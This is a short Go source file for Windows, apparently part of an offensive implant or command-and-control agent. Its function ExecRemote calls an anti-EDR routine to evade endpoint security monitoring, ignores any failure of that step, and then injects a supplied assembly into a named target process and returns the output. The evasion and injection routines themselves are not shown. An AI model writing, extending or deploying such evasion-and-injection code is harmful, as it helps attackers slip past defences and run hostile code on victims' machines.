// +build windows

package arch

import log "github.com/sirupsen/logrus"

func ExecRemote(fileContent []byte, injectInto string) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
	// Activate Anti-EDR if not yet done
	err = AntiEdr()
	if err != nil {
		log.Errorf("Anti EDR failed: %s", err.Error())
		// We dont care if it doesnt work. No return.
	}

	stdOut, stdErr, pid, exitCode, err = ExecuteAssembly(fileContent, injectInto)
	if err != nil {
		return nil, nil, 0, 0, err
	}

	return stdOut, stdErr, pid, exitCode, nil
}
